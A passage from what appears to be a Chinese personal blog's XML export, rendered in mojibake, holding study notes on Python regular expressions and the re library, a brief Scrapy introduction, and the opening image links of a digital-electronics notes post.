è¡¨ç¤ºaåˆ°zå•ä¸ªå­—ç¬¦</td></tr><tr><td align="center"><code>[^]</code></td><td align="center">éå­—ç¬¦é›†ï¼Œå¯¹å•ä¸ªå­—ç¬¦ç»™å‡ºæ’é™¤èŒƒå›´</td><td align="center"><strong>[^abc]</strong> è¡¨ç¤ºéaã€bã€cçš„å•ä¸ªå­—ç¬¦</td></tr><tr><td align="center"><code>*</code></td><td align="center">å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–æ— é™æ¬¡æ‰©å±•</td><td align="center"><strong>abc</strong>* è¡¨ç¤ºabã€abcã€abccã€abcccç­‰</td></tr><tr><td align="center"><code>+</code></td><td align="center">å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡æ‰©å±•</td><td align="center"><strong>abc+</strong> è¡¨ç¤ºabcã€abccã€abcccç­‰</td></tr><tr><td align="center"><code>?</code></td><td align="center">å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ¬¡æ‰©å±•</td><td align="center"><strong>abc?</strong> è¡¨ç¤ºabã€abc</td></tr><tr><td align="center">&#96;</td><td align="center">&#96;</td><td align="center">å·¦å³è¡¨è¾¾å¼ä»»æ„ä¸€ä¸ª</td></tr><tr><td align="center"><code>&#123;m&#125;</code></td><td align="center">æ‰©å±•å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡</td><td align="center">**ab{2}c **è¡¨ç¤ºabbc</td></tr><tr><td align="center"><code>&#123;m,n&#125;</code></td><td align="center">æ‰©å±•å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡ï¼ˆå«nï¼‰</td><td align="center">**ab{1,2}c **è¡¨ç¤ºabcã€abbc</td></tr><tr><td align="center"><code>^</code></td><td align="center">åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´</td><td align="center">**^abc **è¡¨ç¤ºabcä¸”åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´</td></tr><tr><td align="center"><code>$</code></td><td align="center">åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾</td><td align="center">**abc$ **è¡¨ç¤ºabcä¸”åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“å°¾</td></tr><tr><td align="center"><code>()</code></td><td align="center">åˆ†ç»„æ ‡è®°ï¼Œå†…éƒ¨åªèƒ½ä½¿ç”¨| æ“ä½œç¬¦</td><td align="center"><strong>(abc)</strong> è¡¨ç¤ºabcï¼Œ(abc|def)è¡¨ç¤ºabcã€def</td></tr><tr><td align="center"><code>\d</code></td><td align="center">æ•°å­—ï¼Œç­‰ä»·äº[0â€9]</td><td align="center"></td></tr><tr><td align="center"><code>\w</code></td><td align="center">å•è¯å­—ç¬¦ï¼Œç­‰ä»·äº[Aâ€Zaâ€z0â€9_]</td><td align="center"></td></tr></tbody></table><ul><li>ç»å…¸ä¸¾ä¾‹</li></ul><table><thead><tr><th align="center">re</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>^[A-Za-z]+$</code></td><td align="center">ç”±26ä¸ªå­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>^[A-Za-z0-9]+$</code></td><td align="center">ç”±26ä¸ªå­—æ¯å’Œæ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>^-?\d+$</code></td><td align="center">æ•´æ•°å½¢å¼çš„å­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>^[0-9]*[1-9][0-9]*$</code></td><td align="center">æ­£æ•´æ•°å½¢å¼çš„å­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>[1-9]\d&#123;5&#125;</code></td><td align="center">ä¸­å›½å¢ƒå†…é‚®æ”¿ç¼–ç ï¼Œ6ä½</td></tr><tr><td align="center"><code>[\u4ee00-\u9fa5]</code></td><td align="center">åŒ¹é…ä¸­æ–‡å­—ç¬¦ï¼Œç”¨utf-8ç¼–ç ä¸­ä¸­æ–‡å­—ç¬¦çš„åŒºé—´ä»£æ›¿</td></tr><tr><td align="center">&#96;\d{3}-\d{8}</td><td align="center">\d{4}-\d{7}&#96;</td></tr></tbody></table><ul><li>éå¸¸ç»å…¸çš„åŒ¹é… IP åœ°å€çš„æ­£åˆ™è¡¨è¾¾å¼</li></ul><p><code>0-99</code>ï¼š**[1-9]?\d**</p><p><code>100-199</code>ï¼š<strong>1\d{2}</strong></p><p><code>200-249</code>ï¼š<strong>2[0-4]\d</strong></p><p><code>250-255</code>ï¼š<strong>25[0-5]</strong></p><p>æ•´åˆï¼š<code>(([1-9]?\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5]).)&#123;3&#125;([1-9]?\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])</code></p><h3 id="re-åº“åŸºæœ¬ä½¿ç”¨"><a href="#re-åº“åŸºæœ¬ä½¿ç”¨" class="headerlink" title="re åº“åŸºæœ¬ä½¿ç”¨"></a>re åº“åŸºæœ¬ä½¿ç”¨</h3><ul><li>python çš„æ ‡å‡†åº“ï¼Œä¸éœ€è¦é¢å¤–å®‰è£…</li><li><strong>raw string</strong> åŸç”Ÿå­—ç¬¦ä¸²ç±»å‹<ul><li>re åº“é‡‡ç”¨åŸç”Ÿå­—ç¬¦ä¸²ç±»å‹æ¥è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œå½¢å¦‚ <code>r&#39;text&#39;</code>ï¼Œç”¨ string ç±»å‹ä¹Ÿè¡Œï¼Œä½†æ˜¯è¦ç”¨è½¬ä¹‰å­—ç¬¦æ¥è½¬ä¹‰åæ–œæ ï¼Œä¼šæ›´éº»çƒ¦</li><li>æ¯”å¦‚ï¼š<code>r&#39;[1-9]\d&#123;5&#125;&#39;</code> ã€<code>r&#39;\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;&#39;</code></li><li>**raw string **æ˜¯ä¸åŒ…å«è½¬ä¹‰ç¬¦çš„å­—ç¬¦ä¸²ï¼Œè½¬ä¹‰ç¬¦æ¯”å¦‚åæ–œæ <code>\</code></li></ul></li><li>re åº“å¸¸ç”¨åŠŸèƒ½å‡½æ•°</li></ul><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>re.search()</code></td><td align="center">åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœç´¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œè¿”å› match å¯¹è±¡</td></tr><tr><td align="center"><code>re.match()</code></td><td align="center">ä»ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®èµ·åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿”å› match å¯¹è±¡</td></tr><tr><td align="center"><code>re.findall()</code></td><td align="center">æœç´¢å­—ç¬¦ä¸²ï¼Œä»¥åˆ—è¡¨ç±»å‹è¿”å›å…¨éƒ¨èƒ½åŒ¹é…åˆ°çš„å­ä¸²</td></tr><tr><td align="center"><code>re.split()</code></td><td align="center">å°†ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ç…§æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç»“æœè¿›è¡Œåˆ†å‰²ï¼Œè¿”å›åˆ—è¡¨ç±»å‹</td></tr><tr><td align="center"><code>re.finditer()</code></td><td align="center">æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªåŒ¹é…ç»“æœçš„è¿­ä»£ç±»å‹ï¼Œæ¯ä¸ªè¿­ä»£å…ƒç´ æ˜¯ match å¯¹è±¡</td></tr><tr><td align="center"><code>re.sub()</code></td><td align="center">åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ›¿æ¢æ‰€æœ‰åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„å­ä¸²ï¼Œè¿”å›æ›¿æ¢åçš„å­—ç¬¦ä¸²</td></tr></tbody></table><h4 id="re-search-pattern-string-flags-x3D-0"><a href="#re-search-pattern-string-flags-x3D-0" class="headerlink" title="re.search(pattern,string,flags&#x3D;0)"></a>re.search(pattern,string,flags&#x3D;0)</h4><ul><li><p><strong>åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœç´¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œè¿”å› match å¯¹è±¡</strong></p><ul><li><p><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</p></li><li><p><strong>string</strong>ï¼šå¾…åŒ¹é…å­—ç¬¦ä¸²</p></li><li><p><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</p><table><thead><tr><th align="center">å¸¸ç”¨æ ‡è®°</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>re.I re.IGNORECASE</code></td><td align="center">å¿½ç•¥æ­£åˆ™è¡¨è¾¾å¼çš„å¤§å°å†™ï¼Œ[A-Z]èƒ½å¤ŸåŒ¹é…å¤§å°å†™</td></tr><tr><td align="center"><code>re.M re.MULTILINE</code></td><td align="center">æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„^æ“ä½œç¬¦èƒ½å¤Ÿå°†ç»™å®šå­—ç¬¦ä¸²çš„æ¯è¡Œå½“ä½œåŒ¹é…å¼€å§‹</td></tr><tr><td align="center"><code>re.S re.DOTALL</code></td><td align="center">æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„.æ“ä½œç¬¦èƒ½å¤ŸåŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼Œé»˜è®¤åŒ¹é…æ˜¯é™¤æ¢è¡Œä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦</td></tr></tbody></table></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="keyword">match</span>.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">100081</span></span><br></pre></td></tr></table></figure><h4 id="re-match-pattern-string-flags-x3D-0"><a href="#re-match-pattern-string-flags-x3D-0" class="headerlink" title="re.match(pattern,string,flags&#x3D;0)"></a>re.match(pattern,string,flags&#x3D;0)</h4><ul><li><strong>&#x3D;&#x3D;ä»ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®èµ·&#x3D;&#x3D;åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿”å› match å¯¹è±¡</strong><ul><li><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</li><li><strong>string</strong>ï¼šå¾…åŒ¹é…å­—ç¬¦ä¸²</li><li><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"><span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ— è¾“å‡º</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span>.group(<span class="number">0</span>)<span class="comment">#ç›´æ¥è°ƒç”¨æŠ¥é”™ï¼Œè¯´æ˜æ²¡æœ‰åŒ¹é…åˆ°</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#9&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;group&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;100081 BIT&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"><span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;100081&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="re-findall-pattern-string-flags-x3D-0"><a href="#re-findall-pattern-string-flags-x3D-0" class="headerlink" title="re.findall(pattern,string,flags&#x3D;0)"></a>re.findall(pattern,string,flags&#x3D;0)</h4><ul><li>æœç´¢å­—ç¬¦ä¸²ï¼Œä»¥åˆ—è¡¨ç±»å‹è¿”å›å…¨éƒ¨èƒ½åŒ¹é…çš„å­ä¸²<ul><li><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</li><li><strong>string</strong>ï¼šå¾…åŒ¹é…å­—ç¬¦ä¸²</li><li><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls</span><br><span class="line">[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0"><a href="#re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0" class="headerlink" title="re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)"></a>re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)</h4><ul><li>å°†ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ç…§æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç»“æœè¿›è¡Œåˆ†å‰²ï¼Œè¿”å›åˆ—è¡¨ç±»å‹ï¼Œä¹Ÿå°±æ˜¯å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²å»æ‰ï¼Œå‰©ä¸‹çš„å­˜è¿›åˆ—è¡¨è¿”å›<ul><li><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</li><li><strong>string</strong>ï¼šå¾…åŒ¹é…å­—ç¬¦ä¸²</li><li><strong>maxsplit</strong>ï¼šæœ€å¤§åˆ†å‰²æ•°ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€åä¸€ä¸ªå…ƒç´ è¾“å‡º</li><li><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100084&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="re-finditer-pattern-string-flags-x3D-0"><a href="#re-finditer-pattern-string-flags-x3D-0" class="headerlink" title="re.finditer(pattern,string,flags&#x3D;0)"></a>re.finditer(pattern,string,flags&#x3D;0)</h4><ul><li><strong>æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªåŒ¹é…ç»“æœçš„è¿­ä»£ç±»å‹ï¼Œæ¯ä¸ªè¿­ä»£å…ƒç´ æ˜¯matchå¯¹è±¡</strong><ul><li><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</li><li><strong>string</strong>ï¼šå¾…åŒ¹é…å­—ç¬¦ä¸²</li><li><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">100084</span> </span><br></pre></td></tr></table></figure><h4 id="re-sub-pattern-repl-string-count-x3D-0-flags-x3D-0"><a href="#re-sub-pattern-repl-string-count-x3D-0-flags-x3D-0" class="headerlink" title="re.sub(pattern,repl, string,count&#x3D;0,flags&#x3D;0)"></a>re.sub(pattern,repl, string,count&#x3D;0,flags&#x3D;0)</h4><ul><li><strong>åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ›¿æ¢æ‰€æœ‰åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„å­ä¸²ï¼Œè¿”å›æ›¿æ¢åçš„å­—ç¬¦ä¸²</strong><ul><li><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</li><li><strong>repl</strong>ï¼šæ›¿æ¢åŒ¹é…å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²</li><li><strong>string</strong>ï¼šå¾…åŒ¹é…å­—ç¬¦ä¸²</li><li><strong>count</strong>ï¼šåŒ¹é…çš„æœ€å¤§æ›¿æ¢æ¬¡æ•°</li><li><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="ä¸¤ç§ç”¨æ³•"><a href="#ä¸¤ç§ç”¨æ³•" class="headerlink" title="ä¸¤ç§ç”¨æ³•"></a>ä¸¤ç§ç”¨æ³•</h4><ul><li><p>å‡½æ•°å¼ç”¨æ³•ï¼šä¸€æ¬¡æ€§æ“ä½œ</p><p><code>rst = re.search(r&#39;[1-9]\d&#123;5&#125;&#39;,&#39;BIT 10091&#39;)</code></p></li><li><p>é¢å‘å¯¹è±¡ç”¨æ³•ï¼šå°†åŸç”Ÿå­—ç¬¦ä¸²ç¼–è¯‘æˆä¸€ä¸ª re ç±»çš„å¯¹è±¡ï¼Œèƒ½å¤Ÿè¿›è¡Œå¤šæ¬¡æ“ä½œ</p><p><code>pat = re.compile(r&#39;[1-9]\d&#123;5&#125;&#39;)</code></p><p><code>rst = pat.search(&#39;BIT 10091&#39;)</code></p></li><li><p><strong>re.compile(pattern,flags&#x3D;0)</strong></p><ul><li><strong>å°†æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²å½¢å¼ç¼–è¯‘æˆæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡</strong></li><li><strong>pattern</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–åŸç”Ÿå­—ç¬¦ä¸²è¡¨ç¤º</li><li><strong>flags</strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨æ—¶çš„æ§åˆ¶æ ‡è®°</li></ul></li></ul><h3 id="match-å¯¹è±¡"><a href="#match-å¯¹è±¡" class="headerlink" title="match å¯¹è±¡"></a>match å¯¹è±¡</h3><ul><li>match å¯¹è±¡çš„å±æ€§</li></ul><table><thead><tr><th align="center">å±æ€§</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>.string</code></td><td align="center">å¾…åŒ¹é…çš„æ–‡æœ¬</td></tr><tr><td align="center"><code>.re</code></td><td align="center">åŒ¹é…æ—¶ä½¿ç”¨çš„patternå¯¹è±¡ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰</td></tr><tr><td align="center"><code>.pos</code></td><td align="center">æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ–‡æœ¬çš„å¼€å§‹ä½ç½®</td></tr><tr><td align="center"><code>.endpos</code></td><td align="center">æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ–‡æœ¬çš„ç»“æŸä½ç½®</td></tr></tbody></table><ul><li>match å¯¹è±¡çš„æ–¹æ³•</li></ul><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>.group(0)</code></td><td align="center">è·å¾—åŒ¹é…åçš„å­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>.start()</code></td><td align="center">åŒ¹é…å­—ç¬¦ä¸²åœ¨åŸå§‹å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</td></tr><tr><td align="center"><code>.end()</code></td><td align="center">åŒ¹é…å­—ç¬¦ä¸²åœ¨åŸå§‹å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®</td></tr><tr><td align="center"><code>.span()</code></td><td align="center">è¿”å›(.strat(),.end())</td></tr></tbody></table><h3 id="re-åº“ä¸­è´ªå©ªåŒ¹é…å’Œæœ€å°åŒ¹é…"><a href="#re-åº“ä¸­è´ªå©ªåŒ¹é…å’Œæœ€å°åŒ¹é…" class="headerlink" title="re åº“ä¸­è´ªå©ªåŒ¹é…å’Œæœ€å°åŒ¹é…"></a>re åº“ä¸­è´ªå©ªåŒ¹é…å’Œæœ€å°åŒ¹é…</h3><ul><li>re åº“é»˜è®¤é‡‡ç”¨è´ªå©ªåŒ¹é…ï¼ŒåŒ¹é…æœ€é•¿çš„å­ä¸²</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.search(<span class="string">r&#x27;PY.*N&#x27;</span>, <span class="string">&#x27;PYANBNCNDN&#x27;</span>) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;PYANBNCNDN&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡åœ¨æ“ä½œç¬¦åæ·»åŠ  ? å¯å˜æˆæœ€å°åŒ¹é…</li></ul><table><thead><tr><th align="center">æ“ä½œç¬¦</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>*?</code></td><td align="center">å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–æ— é™æ¬¡æ‰©å±•ï¼Œæœ€å°åŒ¹é…</td></tr><tr><td align="center"><code>+?</code></td><td align="center">å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡æ‰©å±•ï¼Œæœ€å°åŒ¹é…</td></tr><tr><td align="center"><code>??</code></td><td align="center">å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ¬¡æ‰©å±•ï¼Œæœ€å°åŒ¹é…</td></tr><tr><td align="center"><code>&#123;m,n&#125;?</code></td><td align="center">æ‰©å±•å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡ï¼ˆå«nï¼‰ï¼Œæœ€å°åŒ¹é…</td></tr></tbody></table><h1 id="ç½‘ç»œçˆ¬è™«ä¹‹æ¡†æ¶"><a href="#ç½‘ç»œçˆ¬è™«ä¹‹æ¡†æ¶" class="headerlink" title="ç½‘ç»œçˆ¬è™«ä¹‹æ¡†æ¶"></a>ç½‘ç»œçˆ¬è™«ä¹‹æ¡†æ¶</h1><h2 id="Scrapyçˆ¬è™«æ¡†æ¶"><a href="#Scrapyçˆ¬è™«æ¡†æ¶" class="headerlink" title="Scrapyçˆ¬è™«æ¡†æ¶"></a>Scrapyçˆ¬è™«æ¡†æ¶</h2><ul><li>å®‰è£…</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><ul><li>æ¡†æ¶ç»“æ„ï¼ˆç›´æ¥ä¸Šå›¾ï¼Œæ€è·¯å¾ˆæ¸…æ™°ï¼‰</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210119180025.png"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°ç”µé€Ÿé€šç¬”è®°</title>
      <link href="/posts/4763/"/>
      <url>/posts/4763/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>è¿™ä¸ªçº¸è´¨ç‰ˆçš„ç¬”è®°è‚¯å®šæ˜¯è¦åœ¨è€ƒå‰æ’•æ‰ç¥­å¤©çš„ï¼Œä½†æ˜¯æœ‰ç‚¹èˆä¸å¾—ï¼Œæç¯‡åšå®¢è®°å½•ä¸‹æ¥ï¼Œ<del>ä¸‡ä¸€é‡ä¿®äº†å‘¢</del>ï¼ˆ60åˆ†é£˜è¿‡ï¼Œæ„Ÿè°¢è€å¸ˆï¼‰</p></blockquote><p><img src="https://ftp.bmp.ovh/imgs/2020/11/f39affa3ecb54f36.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/e7abd6a28b653db0.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/062b6f30a2efb813.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/5743ad70738cb405.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/215f4def5cc2d9d5.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/dbcf2c3a23eb3ed8.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/4ec469397cc63880.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/a964465104fff4e0.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/D097B9ED0D27691E83822263713B3C66.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/3ABB3BAF384C2A0FCE73F9CFC4DCB4EB.jpg"></p><p><img 